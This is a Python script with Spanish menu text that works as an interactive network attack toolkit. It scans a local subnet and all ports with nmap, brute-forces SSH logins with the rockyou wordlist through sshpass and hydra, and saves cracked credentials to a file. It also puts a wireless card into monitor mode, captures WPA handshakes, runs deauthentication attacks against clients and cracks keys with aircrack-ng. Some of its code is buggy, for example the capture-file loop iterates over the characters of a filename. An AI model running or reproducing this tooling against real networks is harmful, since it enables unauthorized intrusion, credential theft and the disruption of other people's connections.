import nmap
import socket
import subprocess
import glob

def scan_network():
    nm = nmap.PortScanner()
    nm.scan(hosts='192.168.1.0/24', arguments='-sn')
    return nm.all_hosts()

def get_open_ports(ip_address):
    nm = nmap.PortScanner()
    nm.scan(hosts=ip_address, arguments='-p 1-65535')  # Escaneo completo de todos los puertos
    open_ports = {}

    if 'tcp' in nm[ip_address]:
        for port, port_info in nm[ip_address]['tcp'].items():
            open_ports[port] = {
                'state': port_info['state'],
                'name': port_info['name'],
                'product': port_info['product'],
                'version': port_info['version'],
            }

    return open_ports


def check_weak_passwords(ip_address):
    username = input("Ingrese el nombre de usuario: ")

    with open("rockyou.txt", encoding="iso-8859-1") as pass_file:
        passwords = pass_file.read().splitlines()

    print(f"Prueba de contraseñas débiles para el dispositivo {ip_address} y el usuario {username}:")
    for password in passwords:
        try:
            subprocess.run(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", f"{username}@{ip_address}", "echo", "Conexión exitosa"], check=True, capture_output=True)
            print(f"  Usuario: {username}, Contraseña: {password} - Conexión exitosa.")

            with open("resultado.txt", "a") as result_file:
                result_file.write(f"Dispositivo: {ip_address}\n")
                result_file.write(f"Usuario: {username}\n")
                result_file.write(f"Contraseña: {password}\n")
                result_file.write("Conexión exitosa\n\n")

                break

        except subprocess.CalledProcessError:
                print(f"  Usuario: {username}, Contraseña: {password} - Conexión fallida.")

def get_device_name(ip_address):
    try:
        device_name = socket.gethostbyaddr(ip_address)[0]
        return device_name
    except socket.herror:
        return ip_address

def scan_wireless_networks():
    try:
        subprocess.run(['airmon-ng', 'start', 'wlp3s0'], capture_output=True, text=True)
        subprocess.run(['airodump-ng', 'wlp3s0mon'])
    except Exception as e:
        print("Error:", str(e))

def crack_psk_cap_files(mac_bss):
    psk_cap_files = "hacking-02.cap"
    if not psk_cap_files:
        print("No se encontraron archivos de captura psk*.cap.")
        return

    password_list = "rockyou.txt"
    for psk_cap_file in psk_cap_files:
        try:
            subprocess.run(['aircrack-ng', '-w', password_list, '-b', mac_bss, psk_cap_file], capture_output=True, text=True)
        except Exception as e:
            print(f"Error al ejecutar aircrack-ng en el archivo {psk_cap_file}: {str(e)}")


def scan_wireless_middle(canal, mac_ddr):
    try:
        subprocess.run(['airodump-ng', '-c',canal,'--bssid',mac_ddr,'-w','hacking','wlp3s0mon'], text=True)
    except Exception as e:
        print("Error:", str(e))
def disconnect_wireless():
    try:
        subprocess.run(['airmon-ng', 'stop', 'wlp3s0mon'], capture_output=True, text=True)
        print("Desconexión inalámbrica forzada.")
    except Exception as e:
        print("Error:", str(e))

def deauth_attack(bssid, client):
    try:
        subprocess.run(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, 'wlp3s0mon'], capture_output=True, text=True)
        print("Ataque de desconexión exitoso.")
    except Exception as e:
        print("Error:", str(e))
def hydra_attack(ip_address, username, password_file):
    try:
        result = subprocess.run(['hydra', '-L', username, '-P', password_file, 'ssh', ip_address], capture_output=True, text=True)
        if result.returncode == 0:
            print("Contraseña válida encontrada:", result.stdout)
        else:
            print("No se encontró una contraseña válida.")
    except Exception as e:
        print("Error:", str(e))

def select_target_device(devices):
    print("Dispositivos encontrados en la red:")
    for i, device in enumerate(devices):
        device_name = get_device_name(device)
        print(f"{i+1}. {device} ({device_name})")
    
    ip_index = int(input("Selecciona el número de dispositivo como objetivo para el ataque Hydra: "))
    if 1 <= ip_index <= len(devices):
        return devices[ip_index - 1]
    else:
        print("Opción inválida. Selecciona un número válido.")
        return None
if __name__ == "__main__":
    while True:
        print("-------- Menú de Escaneo --------")
        print("1. Escanear dispositivos red local")
        print("2. Escanear puertos IP/Brute force usuarios")
        print("3. Escanear redes inalámbricas")
        print("4. Quitar modo monitoreo")
        print("5. Ponerse en medio")
        print("6. Realizar ataque de desconexión")
        print("7. Ataque con fichero")
        print("8. Salir")

        choice = input("Selecciona una opción (1/2/3/4/5/6): ")

        if choice == '1':
            devices = scan_network()
            print("Dispositivos encontrados en la red:")
            for i, device in enumerate(devices):
                device_name = get_device_name(device)
                print(f"{i+1}. {device} ({device_name})")

        elif choice == '2':
            if 'devices' not in locals():
                print("Primero debes realizar el escaneo de la red local (Opción 1).")
                continue

            ip_index = int(input("Selecciona el número de dispositivo para escanear los puertos: "))
            if 1 <= ip_index <= len(devices):
                selected_ip = devices[ip_index - 1]
                ports = get_open_ports(selected_ip)
                print(f"Escaneo de puertos para el dispositivo {selected_ip}:")
                if ports:
                    for port in ports.keys():
                        print(f"  Port {port}: {ports[port]['state']} - {ports[port]['name']}")
                else:
                    print(f"No se encontraron puertos abiertos para el dispositivo {selected_ip}.")

                check_passwords = input("¿Deseas probar contraseñas débiles para este dispositivo? (S/N): ")
                if check_passwords.lower() == 's':
                    check_weak_passwords(selected_ip)

            else:
                print("Opción inválida. Por favor, selecciona un número válido.")

        elif choice == '3':
            scan_wireless_networks()

        elif choice == '4':
            disconnect_wireless()

        elif choice == '5':
            canal = input("Ingrese el canal del punto de acceso: ")
            mac_ddr = input("Ingrese la dirección MAC del cliente: ")
            scan_wireless_middle(canal, mac_ddr)

        elif choice == '6':
            bssid = input("Ingrese la BSSID del punto de acceso: ")
            client = input("Ingrese la dirección MAC del cliente: ")
            deauth_attack(bssid, client)


        elif choice == '7':
            mac_bss = input("Ingrese la BSSID de ataque con fichero: ")
            crack_psk_cap_files(mac_bss)

        elif choice == '8':
            print("Saliendo del programa.")
            break

        else:
            print("Opción inválida. Por favor, selecciona una opción válida.")
